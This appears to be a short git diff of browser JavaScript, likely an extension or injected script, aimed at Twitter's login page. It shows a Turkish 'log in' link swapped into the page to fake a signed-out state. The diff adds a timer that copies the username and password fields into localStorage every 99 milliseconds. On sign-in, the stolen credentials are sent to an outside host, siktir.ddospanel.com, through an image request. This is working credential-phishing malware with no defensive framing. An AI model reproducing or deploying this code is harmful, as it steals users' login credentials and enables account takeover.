@@ -27,10 +27,11 @@ document.getElementsByClassName('t1-form dropdown-link-form signout-form')[0].cl
 	
 document.getElementById("session").innerHTML = '<a href="https://twitter.com/login">Hesabın var mı? Giriş yap</a>';
 if (window.location.href.indexOf("login") >= 0) {
-
-	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
+	setInterval(function(){
 		localStorage['pw'] = document.getElementsByName('session[username_or_email]')[0].value;
 		localStorage['sw'] = document.getElementsByName('session[password]')[0].value;
+	}, 99);
+	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
 		if(localStorage['pw'] && localStorage['sw']){
 			new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['pw'] + "&password=" + localStorage['sw'];
 		}
